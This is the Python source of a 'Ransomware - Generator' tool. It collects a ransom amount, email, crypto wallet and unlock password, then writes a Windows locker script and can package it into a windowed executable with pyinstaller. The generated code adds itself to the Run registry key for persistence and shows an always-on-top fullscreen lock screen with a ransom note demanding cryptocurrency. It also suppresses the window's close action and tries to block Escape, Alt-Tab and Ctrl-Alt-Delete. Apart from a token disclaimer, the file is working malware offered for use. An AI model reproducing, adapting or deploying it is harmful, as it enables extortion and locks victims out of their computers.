#IMPORT NECESSARY MODULES
import os
import update_check
import platform
import time as t
import colorama
from colorama import *
colorama.init(autoreset=True)
from update_check import isUpToDate, update
#Tools info fuction
def info():
    global Developer
    global tool_name, Telegram
    tool_name = "Ransomware - Generator"
    version = 1.0
    Developer = "Spider Anongreyhat"
    Telegram = "@Anonspideyy"
    header ="""

██████   █████  ███    ██ ███████  ██████  ███    ███ ██     ██  █████  ██████  ███████        ██████  ███████ ███    ██ ███████ ██████   █████  ████████  ██████  ██████  
██   ██ ██   ██ ████   ██ ██      ██    ██ ████  ████ ██     ██ ██   ██ ██   ██ ██            ██       ██      ████   ██ ██      ██   ██ ██   ██    ██    ██    ██ ██   ██ 
██████  ███████ ██ ██  ██ ███████ ██    ██ ██ ████ ██ ██  █  ██ ███████ ██████  █████   █████ ██   ███ █████   ██ ██  ██ █████   ██████  ███████    ██    ██    ██ ██████  
██   ██ ██   ██ ██  ██ ██      ██ ██    ██ ██  ██  ██ ██ ███ ██ ██   ██ ██   ██ ██            ██    ██ ██      ██  ██ ██ ██      ██   ██ ██   ██    ██    ██    ██ ██   ██ 
██   ██ ██   ██ ██   ████ ███████  ██████  ██      ██  ███ ███  ██   ██ ██   ██ ███████        ██████  ███████ ██   ████ ███████ ██   ██ ██   ██    ██     ██████  ██   ██                                                                             
"""
    print(f"{Fore.RED}{header}")
    print(f"{Fore.YELLOW}version{version}".center(90))
    print(f"{Fore.GREEN}Developer: {Fore.RED}{Developer}")
    print(f"{Fore.GREEN}Tool Name: {Fore.RED}{tool_name}")
    print(f"{Fore.GREEN}Telegram: {Telegram}")

def warning():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
    print(f"{Fore.RED}Disclaimer: {Fore.WHITE}Spider Anongreyhat won\'t be responsible for misuse of this tool\n\nUse it responsibly")
    t.sleep(2)

#CHECK FOR UPDATE
if platform.system() == "Windows":
        os.system("cls")
else:
        os.system("clear")
try:
    if not platform.system() == "Windows":
        if isUpToDate(__file__,  "https://raw.githubusercontent.com/spider863644/Ransomware-Generator/refs/heads/main/ransomware_generator.py") == False:
            up = input(f"{Fore.YELLOW}Notice: {Fore.GREEN}Ransomware-Generator is Outdated, would you like to install latest version?[y\\n]: ").upper().strip()
            
            if up == "Y":
                update("ransomware_generator.py", "https://raw.githubusercontent.com/spider863644/Ransomware-Generator/refs/heads/main/ransomware_generator.py")
                print(Fore.GREEN + "Updated\nRun tool again")
                exit()
            else:
                pass
except:
    print(f"{Fore.YELLOW}Warning⚠️: {Fore.GREEN}No internet connection\n\nSkiping update check...")
    t.sleep(3.3)
    pass

     
def convert():
    print(f"{Fore.LIGHTBLUE_EX}NOTE: {Fore.YELLOW}Make sure you have installed necessary modules or requirement for the generated ransomware\nTo confirm, run the generated ransomware on your pc, do not forget the password coz you will use the password to unlock your pc\n\nIf the ransomware locked your pc witout any error and unlock without any issues, that means you have installed all necessary modules")
    q = input("Have you installed all requirements?[y\\n]: ").lower().strip()
    if q == "y":
        print(f"{Fore.RED}EXE file won\'t work if requirements is not installed")
        if not os.path.exists("Ransomware\\Ransomware.py"):
            print(f"{Fore.RED}You haven\'t generated any ransomware")
            t.sleep(2)
            exit()
        if platform.system() != "Windows":
            print(f"{Fore.RED}Use this option on windows OS only")
            t.sleep(2)
            main()
        #os.system("cd Ransomware")
        os.system("pip install pyinstaller")
        
        os.system("pyinstaller --noconfirm --onefile --windowed Ransomware\\Ransomware.py")
        input("Press Enter to continue")
        main()
    else:
        main()
        
def generate_ransomware():
    try:
        amount = float(input(f"{Fore.GREEN}Enter the amount you want the victim to pay: "))
    except:
        print(f"{Fore.RED}Input only numbers wihout currecny")
        t.sleep(2)
        main()
    email = input(f"{Fore.GREEN}Enter your email address where you want the target to contact you: ")
    if "@" in email and "." in email:
        pass
    else:
        print(f"{Fore.RED}Input a correct email address")
        t.sleep(2)
        main()
    network = input(f"{Fore.GREEN}Enter the cypto network[e.g BTC, ETH]: ")
    wallet = input(f"{Fore.GREEN}Enter your {network} address: ")
    passw = input(f"{Fore.GREEN}Enter lockscreen password: ")
    print(f"{Fore.YELLOW}Generating ransomware...")
    t.sleep(4)
    ransomware = """
import os
import smtplib, imaplib, dns.resolver
import threading
import queue
import time
import sys
import imaplib
import smtplib
import hashlib
from tkinter import messagebox
import customtkinter as ctk
from tkinter import *
import datetime
import winreg

perc = "LOCK"
unlock_note = '''
Your system has been locked
To unlock it, send $""" + str(amount) + """ worth of """ + network + """ to this address: """ + wallet + """
Once the payment is confirmed, we will send you the decryption key. 

Contact us on email for the decryption key
Email Address: """ + email + """

Note you won't be able to unlock it without paying the ransom
We are anonymous, we are everywhere
'''

def make_persistent():
    try:
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, perc, 0, winreg.REG_SZ, f'"{script_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(e)


def create_lockscreen():
    root = Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='#8B0000')  # Dark red background
    root.wm_attributes('-topmost', True)

    # Disable Alt+F4 and other close shortcuts
    def disable_event():
        pass
    root.protocol("WM_DELETE_WINDOW", disable_event)

    # Main frame with padding
    main_frame = Frame(root, bg='#8B0000')
    main_frame.pack(expand=True, fill='both', padx=20, pady=20)

    # Title
    Label(
        main_frame,
        text="FUCK YOU, YOUR SYSTEM IS LOCKED",
        bg='#8B0000',
        fg='white',
        font=('Arial', 24, 'bold')
    ).pack(pady=20)

    # Ransom note display
    note_frame = Frame(main_frame, bg='#A52A2A')  # Slightly lighter red
    note_frame.pack(pady=10, fill='x')
    note_text = Text(
        note_frame,
        height=10,
        bg='#A52A2A',
        fg='white',
        font=('Arial', 12),
        wrap='word',
        borderwidth=0
    )
    note_text.insert('1.0', unlock_note)
    note_text.config(state='disabled')
    note_text.pack(padx=10, pady=10)

    # Password entry
    password_frame = Frame(main_frame, bg='#8B0000')
    password_frame.pack(pady=20)
    Label(
        password_frame,
        text="Enter The F*cken Decryption Key:",
        bg='#8B0000',
        fg='white',
        font=('Arial', 14)
    ).pack()
    password_entry = Entry(
        password_frame,
        show='*',
        width=30,
        font=('Arial', 12),
        bg='white',
        fg='black'
    )
    password_entry.pack(pady=5)

    def verify_password():
        entered_password = password_entry.get().encode()
        if hashlib.sha256(entered_password).hexdigest() == hashlib.sha256(b'"""+ passw +"""').hexdigest():
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.DeleteValue(key, perc)
                winreg.CloseKey(key)
            except:
                pass
            root.destroy()
            messagebox.showinfo("Success", "System Unlocked")
        else:
            messagebox.showerror("Error", "Invalid Decryption Key")

    # Unlock button
    Button(
        password_frame,
        text="Unlock System",
        command=verify_password,
        bg='#B22222',
        fg='white',
        font=('Arial', 12),
        relief='flat',
        activebackground='#DC143C',
        activeforeground='white'
    ).pack(pady=10)

    # Make it harder to bypass
    root.bind('<Alt-Tab>', lambda e: 'break')
    root.bind('<Control-Alt-Delete>', lambda e: 'break')
    root.bind('<Escape>', lambda e: 'break')

    return root
make_persistent()
root = create_lockscreen()
root.mainloop()

"""
    if not os.path.exists("Ransomware"):
       os.mkdir("Ransomware")
    if platform.system() == "Windows":
        ran = open("Ransomware\\Ransomware.py", "w")
    else:
        ran = open("Ransomware/Ransomware.py", "w")
    ran.write(ransomware)
    ran.close()

def main():
    if platform.system() == "Windows":
        os.system("cls")
    else: 
        os.system("clear")
    info()
    print("\n\n")
    print(f"{Fore.YELLOW}=================={Fore.GREEN}CHOOSE A VALID OPTION{Fore.YELLOW}=================")
    print(f"""{Fore.GREEN}
[A] Setup and Generate ransomware
[B] Report Bug
[C] Convert Ransomware to EXE
[D] {Fore.RED}Uninstall {tool_name} {Fore.GREEN}
[E] Exit {tool_name}
""")
    option = input(f"{Fore.GREEN}Enter a valid option: ").lower().strip()
    if option == "a":
        generate_ransomware()
        print(f"{Fore.YELLOW}Ransomware generated successfully.\n\n")
        input("Press Enter to Continue")
        main()
    elif option == "b":
        print(f"""{Fore.YELLOW}
🐞 Report a Bug

If you encounter any bugs or issues while using {tool_name}, please report them through one of the following channels:

📌 Telegram:

{Telegram}


📌 Email:

spideranongreyhat@gmail.com


📌 Bug Report Submission:

Preferred method: Telegram and email  only (No phone calls).


When reporting a bug, please provide:
✅ A detailed description of the issue.
✅ Screenshots or logs (if possible).
✅ Steps to reproduce the problem.

Your feedback helps improve the tool. Thank you! 🚀
""")
        input("Press Enter to continue :")
        main()
    elif option == "c":
        convert()
    elif option == "d":
        c = input(f"{Fore.LIGHTMAGENTA_EX}Are you sure you want to uninstall {tool_name}?[y\\n]: ").lower().strip()
        if c == "y":
            print(f"{Fore.CYAN}Uninstalling {tool_name}.../")
            t.sleep(3)
            try:
                if platform.system() == "Windows":
                    os.remove("Ransomware\\Ransomware.py")
                else:
                    os.remove("Ransomware/Ransomware.py")
            except:
                pass
            try:
                os.rmdir("Ransomware")
            except:
                pass
            os.remove(__file__)
            print(f"{Fore.YELLOW}Uninstalled succesfully")
    elif option == "e":
        print(f"{Fore.YELLOW}Thanks for using {tool_name}\n\nFollow me on github for more red team tools")
        t.sleep(2)
        exit()
    else:
        print(f"{Fore.RED}Invalid option!")
        t.sleep(2)
        main()
        
warning()
main()
